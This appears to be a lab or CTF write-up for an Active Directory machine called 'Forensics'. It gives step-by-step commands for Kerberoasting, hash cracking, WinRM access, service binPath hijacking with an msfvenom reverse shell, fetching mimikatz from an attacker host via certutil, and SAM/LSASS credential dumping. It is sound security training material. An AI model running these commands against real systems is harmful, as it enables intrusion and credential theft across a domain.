# Forensics

## Enumeration&#x20;

### Assumed breached credentials&#x20;

```
User: shannon
Password: GoldSeagull123
```

### Bloodhound-python

```
Command:- bloodhound-python -u shannon -p GoldSeagull123 -d 'LAINOSCP.local' -ns 10.1.123.237 -c all --zip
```

User shannon has generic write permissions on LION, can abuse this privileges by doing targetedkeberoasting

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

```
Command:- targetedKerberoast.py -v -d 'LAINOSCP.local' -u 'shannon' -p 'GoldSeagull123'
```

### Hash cracking with hashcat&#x20;

Cracked the password with hashcat, copy the generated hash in a file

```
Command:- hashcat -m 13100 hashfile rockyou.txt 
```

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

### Port 5985 - winrm&#x20;

Gained winrm access on WS01 as user LION&#x20;

```
Command:- nxc winrm 10.1.196.103 -u lion -p 'Redacted'
```

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Found a database file in downloads&#x20;

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Download the database file

file, seems like password protected using office2john, and cracking it with john the ripper

<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

This Repo works well for accdb files, clone the repo&#x20;

[https://github.com/thealbinary/Accdb.git ](https://github.com/thealbinary/Accdb.git)&#x20;

<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

Reterived user kanon and gap credentials with accdb.py



<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

Gained winrm access as user kanon, and found dangerous service  permissions with privesccheck.ps1, user kanon can start, stop and modify the service wuauserv&#x20;

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

Create a reverse shell with msfvenom, so that it can be used as service bin path, and upon restarting I get full terminal shell access&#x20;

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

modify the binpath with uploaded file.exe reverse shell

```
Command:- sc.exe config wuauserv binPath= "C:\Users\kanon\file.exe"
```

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

In order to get administrator hash, upload mimikatz

```
Command:- certutil -urlcache -f http://10.200.108.252/mimikatz.exe mimikatz.exe
```

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

Run mimikatz.exe&#x20;

```
Command:- lsadump::sam
```

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Did a secretsdump with admin hash, and found clear text password for user erika&#x20;

```
Command:- secretsdumps.py administrator@10.1.196.103 -hashes ':REDACTED'
```

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

Erika has winrm access on FORENSICS01

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

SeDebugPrivilege is enabled, and can abuse this privilge with procdump.exe -> dump lssas file and upload mimikatz , we can leverage this and get domain hash and download the lsass.dmp file

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

Use pypykatz to dump lsass

```
Command:- pypykatz lsa minidump lsass.dmp
```

<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>





























